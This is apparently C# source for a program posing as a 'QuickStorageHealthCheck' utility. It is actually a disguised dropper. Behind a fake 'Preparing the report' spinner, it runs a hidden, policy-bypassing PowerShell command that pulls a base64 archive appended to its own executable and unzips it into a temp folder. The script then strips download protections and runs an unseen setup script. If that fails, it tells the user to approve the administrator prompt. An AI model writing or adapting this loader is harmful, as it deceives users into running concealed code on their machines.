using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Text;
using System.Windows.Forms;

[assembly: System.Reflection.AssemblyTitle("QuickStorageHealthCheck")]
[assembly: System.Reflection.AssemblyProduct("QuickStorageHealthCheck")]

static class Program
{
    [STAThread]
    static void Main()
    {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        Application.Run(new WaitForm());
    }
}

sealed class WaitForm : Form
{
    readonly Timer timer = new Timer();
    float angle;
    bool failed;

    public WaitForm()
    {
        Text = "QuickStorageHealthCheck";
        FormBorderStyle = FormBorderStyle.None;
        StartPosition = FormStartPosition.CenterScreen;
        ClientSize = new Size(380, 220);
        BackColor = Color.FromArgb(7, 8, 10);
        ForeColor = Color.FromArgb(244, 241, 234);
        DoubleBuffered = true;
        ShowInTaskbar = true;
        timer.Interval = 16;
        timer.Tick += delegate
        {
            angle = (angle + 8f) % 360f;
            Invalidate();
        };
        timer.Start();
        Shown += delegate
        {
            System.Threading.ThreadPool.QueueUserWorkItem(delegate { Run(); });
        };
    }

    protected override void OnPaint(PaintEventArgs e)
    {
        e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
        string text = failed
            ? "Setup did not finish. Approve the administrator prompt and run the setup again."
            : "Preparing the report";
        using (Font font = new Font("Segoe UI", failed ? 11f : 12f))
        using (SolidBrush brush = new SolidBrush(failed ? Color.FromArgb(255, 180, 168) : ForeColor))
        using (StringFormat format = new StringFormat())
        {
            format.Alignment = StringAlignment.Center;
            format.LineAlignment = StringAlignment.Center;
            if (!failed)
            {
                Rectangle rect = new Rectangle((ClientSize.Width - 54) / 2, 58, 54, 54);
                using (Pen track = new Pen(Color.FromArgb(40, 244, 241, 234), 3))
                using (Pen pen = new Pen(Color.FromArgb(214, 255, 74), 3))
                {
                    pen.StartCap = LineCap.Round;
                    pen.EndCap = LineCap.Round;
                    e.Graphics.DrawEllipse(track, rect);
                    e.Graphics.DrawArc(pen, rect, angle, 90);
                }
            }
            RectangleF box = new RectangleF(28, failed ? 60 : 130, ClientSize.Width - 56, failed ? 100 : 40);
            e.Graphics.DrawString(text, font, brush, box, format);
        }
    }

    protected override void OnMouseClick(MouseEventArgs e)
    {
        if (failed) Close();
    }

    void Run()
    {
        int code = 1;
        try
        {
            string encoded = Convert.ToBase64String(Encoding.Unicode.GetBytes(Script));
            ProcessStartInfo start = new ProcessStartInfo();
            start.FileName = "powershell.exe";
            start.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand " + encoded;
            start.UseShellExecute = false;
            start.CreateNoWindow = true;
            start.WindowStyle = ProcessWindowStyle.Hidden;
            start.EnvironmentVariables["QSHC_SRC"] = Application.ExecutablePath;
            using (Process proc = Process.Start(start))
            {
                proc.WaitForExit();
                code = proc.ExitCode;
            }
        }
        catch (Exception)
        {
            code = 1;
        }
        BeginInvoke((Action)delegate
        {
            if (code == 0) Close();
            else
            {
                failed = true;
                timer.Stop();
                Invalidate();
            }
        });
    }

    const string Script =
@"$ErrorActionPreference = ""Stop""
$src = $env:QSHC_SRC
$raw = [IO.File]::ReadAllText($src)
$mark = ""###QSHC-PAYLOAD###""
$i = $raw.LastIndexOf($mark)
if ($i -lt 0) { exit 1 }
$b64 = ($raw.Substring($i + $mark.Length) -replace ""\s"","""")
$bytes = [Convert]::FromBase64String($b64)
$dest = Join-Path $env:TEMP (""QuickStorageHealthCheck-"" + [guid]::NewGuid().ToString(""n""))
[void](New-Item -ItemType Directory -Force -Path $dest)
$zip = Join-Path $dest ""payload.zip""
[IO.File]::WriteAllBytes($zip, $bytes)
Expand-Archive -Force -Path $zip -DestinationPath $dest
foreach ($f in (Get-ChildItem -LiteralPath $dest -File)) { Unblock-File -LiteralPath $f.FullName -ErrorAction SilentlyContinue }
& (Join-Path $dest ""Run-QuietSetup.ps1"")
if (-not $?) { exit 1 }
";
}
